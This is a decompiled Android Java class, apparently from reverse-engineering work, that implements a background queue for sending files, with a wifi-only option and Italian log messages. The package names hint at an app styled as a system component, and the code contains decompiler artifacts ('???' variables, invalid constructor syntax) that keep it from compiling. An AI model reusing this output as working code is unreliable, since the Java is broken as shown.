package com.app.system.common.f.a;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import com.security.ServiceSettings;
import com.security.d.a;
import java.util.ArrayList;

public class h
{
  private static h a;
  private final Object b = new Object();
  private final ArrayList<e> c = new ArrayList();
  private boolean d = false;
  
  public static h a()
  {
    if (a == null) {
      a = new h();
    }
    return a;
  }
  
  private int b(e parame)
  {
    if (parame != null) {
      for (int i = 0; i < this.c.size(); i++) {
        if (parame.equals(this.c.get(i))) {
          return i;
        }
      }
    }
    return -1;
  }
  
  private e b()
  {
    synchronized (this.c)
    {
      e locale;
      if (!this.c.isEmpty())
      {
        locale = (e)this.c.get(0);
        this.c.remove(0);
      }
      else
      {
        locale = null;
      }
      return locale;
    }
  }
  
  private boolean c()
  {
    synchronized (this.c)
    {
      if (!this.c.isEmpty())
      {
        boolean bool = this.c.get(0) instanceof f;
        return bool;
      }
      return false;
    }
  }
  
  private f d()
  {
    synchronized (this.c)
    {
      boolean bool = this.c.isEmpty();
      Object localObject1 = null;
      Object localObject3 = null;
      if (!bool)
      {
        localObject1 = localObject3;
        if ((this.c.get(0) instanceof f)) {
          localObject1 = (f)this.c.get(0);
        }
        this.c.remove(0);
      }
      return (f)localObject1;
    }
  }
  
  private int e()
  {
    synchronized (this.c)
    {
      int i = this.c.size();
      return i;
    }
  }
  
  public void a(final Context paramContext)
  {
    synchronized (this.b)
    {
      if (this.d)
      {
        a.d("SenderQueue", "INVIO FILE GIA' IN CORSO -- IGNORATO", new Object[0]);
        return;
      }
      boolean bool1 = ServiceSettings.a().wifiOnlySend;
      final boolean bool2 = true;
      if (bool1) {
        bool1 = ((ConnectivityManager)paramContext.getSystemService("connectivity")).getNetworkInfo(1).isConnected();
      } else {
        bool1 = true;
      }
      if ((bool1) || (!c())) {
        bool2 = false;
      }
      if ((!bool1) && (!bool2))
      {
        a.d("SenderQueue", "WIFI disconnesso -- invio file rimandato", new Object[0]);
      }
      else
      {
        final int i = e();
        if (i == 0)
        {
          a.d("SenderQueue", "LA CODA INVIO E' VUOTA -- STATT BBUON", new Object[0]);
          return;
        }
        ??? = new StringBuilder();
        ((StringBuilder)???).append("INIZIO SEQUENZA INVIO -- (TOTALE ");
        ((StringBuilder)???).append(i);
        ((StringBuilder)???).append(")");
        a.d("SenderQueue", ((StringBuilder)???).toString(), new Object[0]);
        new Thread(new Runnable()
        {
          public void run()
          {
            synchronized (h.a(h.this))
            {
              h.a(h.this, true);
              try
              {
                if (bool2) {
                  for (;;)
                  {
                    ??? = h.b(h.this);
                    if (??? == null) {
                      break;
                    }
                    ??? = new java/lang/StringBuilder;
                    ((StringBuilder)???).<init>();
                    ((StringBuilder)???).append("INVIO ");
                    ((StringBuilder)???).append(???);
                    a.d("SenderQueue", ((StringBuilder)???).toString(), new Object[0]);
                    ((f)???).a(paramContext);
                  }
                }
                for (;;)
                {
                  ??? = h.c(h.this);
                  if (??? == null) {
                    break;
                  }
                  ??? = new java/lang/StringBuilder;
                  ((StringBuilder)???).<init>();
                  ((StringBuilder)???).append("INVIO ");
                  ((StringBuilder)???).append(???);
                  a.d("SenderQueue", ((StringBuilder)???).toString(), new Object[0]);
                  ((e)???).a(paramContext);
                }
                synchronized (h.a(h.this))
                {
                  h.a(h.this, false);
                  ??? = new StringBuilder();
                  ((StringBuilder)???).append("FINE SEQUENZA INVIO -- (TOTALE ");
                  ((StringBuilder)???).append(i);
                  ((StringBuilder)???).append(")");
                  a.d("SenderQueue", ((StringBuilder)???).toString(), new Object[0]);
                  return;
                }
                localObject7 = finally;
              }
              finally
              {
                synchronized (h.a(h.this))
                {
                  h.a(h.this, false);
                  ??? = new StringBuilder();
                  ((StringBuilder)???).append("FINE SEQUENZA INVIO -- (TOTALE ");
                  ((StringBuilder)???).append(i);
                  ((StringBuilder)???).append(")");
                  a.d("SenderQueue", ((StringBuilder)???).toString(), new Object[0]);
                  throw ((Throwable)localObject5);
                }
              }
            }
          }
        }, "SenderThread").start();
      }
      return;
    }
  }
  
  public void a(e parame)
  {
    synchronized (this.c)
    {
      StringBuilder localStringBuilder;
      if (b(parame) == -1)
      {
        this.c.add(parame);
        localStringBuilder = new java/lang/StringBuilder;
        localStringBuilder.<init>();
        localStringBuilder.append("Aggiunto ");
        localStringBuilder.append(parame);
        localStringBuilder.append(" alla coda invio");
        a.d("SenderQueue", localStringBuilder.toString(), new Object[0]);
      }
      else
      {
        localStringBuilder = new java/lang/StringBuilder;
        localStringBuilder.<init>();
        localStringBuilder.append("E' già presente ");
        localStringBuilder.append(parame);
        localStringBuilder.append(" nella coda invio");
        a.d("SenderQueue", localStringBuilder.toString(), new Object[0]);
      }
      return;
    }
  }
  
  public void a(f paramf)
  {
    synchronized (this.c)
    {
      StringBuilder localStringBuilder;
      if (b(paramf) == -1)
      {
        this.c.add(0, paramf);
        localStringBuilder = new java/lang/StringBuilder;
        localStringBuilder.<init>();
        localStringBuilder.append("Aggiunto ");
        localStringBuilder.append(paramf);
        localStringBuilder.append(" alla coda invio");
        a.d("SenderQueue", localStringBuilder.toString(), new Object[0]);
      }
      else
      {
        localStringBuilder = new java/lang/StringBuilder;
        localStringBuilder.<init>();
        localStringBuilder.append("E' già presente ");
        localStringBuilder.append(paramf);
        localStringBuilder.append(" nella coda invio");
        a.d("SenderQueue", localStringBuilder.toString(), new Object[0]);
      }
      return;
    }
  }
}


/* Location:              ~/com/app/system/common/f/a/h.class
 *
 * Reversed by:           J
 */